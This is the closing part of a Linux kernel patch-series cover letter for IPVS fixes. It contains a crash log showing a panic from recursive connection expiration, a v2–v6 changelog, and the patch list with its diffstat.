[   40.951167] CPU: 0 UID: 0 PID: 11 Comm: kworker/0:1 Tainted: G        W           7.3.0-rc2-g70194dc37670 #1 PREEMPT(lazy) 
[   40.951167] Tainted: [W]=WARN
[   40.951167] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   40.951167] Workqueue:  0x0 (events_freezable_pwr_efficient)

[   40.951167] Call Trace:
[   40.951167]  <TASK>
[   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
[   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
[   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
[   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
[   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
[   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
[   40.951167]  ? ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:1341 net/netfilter/ipvs/ip_vs_conn.c:1375)
[   40.951167]  ? __pfx_ip_vs_conn_expire (net/netfilter/ipvs/ip_vs_conn.c:380 (discriminator 5))
[   40.951167]  </TASK>

[   40.951167] Kernel panic - not syncing: Fatal exception
[   40.951167] Shutting down cpus with NMI
[   40.951167] Kernel Offset: disabled
[   40.951167] ---[ end Kernel panic - not syncing: Fatal exception ]---
-----END crash log-----

changes in v6:
  - Replace the v5 deletion patch with Julian Anastasov's latest
    reference-accounting connection-deletion fix.
  - Rebase the iterative controller cleanup on the new deletion helper
    and retain the passive and active FTP control-port checks.
  - v5 Link: https://lore.kernel.org/all/cover.1790266803.git.zihanx@nebusec.ai/
changes in v5:
  - Update patch 1 with Julian Anastasov's v3 connection-deletion fix.
  - Rebase the iterative cleanup and resend the FTP checks as patch 3/3.
  - v4 Link: https://lore.kernel.org/all/cover.1790146910.git.zihanx@nebusec.ai/
changes in v4:
  - Add the timer-callback deletion fix as patch 1 and rebase the
    iterative controller cleanup on it.
  - Add the active-mode guard for configured FTP control ports.
  - v3 Link: https://lore.kernel.org/all/cover.1789877273.git.zihanx@nebusec.ai/
changes in v3:
  - Add the active-mode guard for configured FTP control ports.
  - Handle the timer-callback race while keeping cleanup iterative.
  - v2 Link: https://lore.kernel.org/all/cover.1789435989.git.zihanx@nebusec.ai/
changes in v2:
  - Replace recursive controller expiration with an iterative path.
  - Add the FTP-helper checks for configured control ports.
  - v1 Link: https://lore.kernel.org/all/cover.1789110326.git.zihanx@nebusec.ai/

Best regards,
Zihan Xi

Julian Anastasov (1):
  ipvs: fix problems during connection deletion

Zihan Xi (2):
  ipvs: avoid stack overflow from recursive connection expiration
  ipvs: reject FTP control ports as data ports

 include/net/ip_vs.h             |   1 -
 net/netfilter/ipvs/ip_vs_conn.c | 125 +++++++++++++++++++-------------
 net/netfilter/ipvs/ip_vs_ftp.c  |  18 +++++
 net/netfilter/ipvs/ip_vs_sync.c |   2 +-
 4 files changed, 95 insertions(+), 51 deletions(-)

-- 
2.43.0

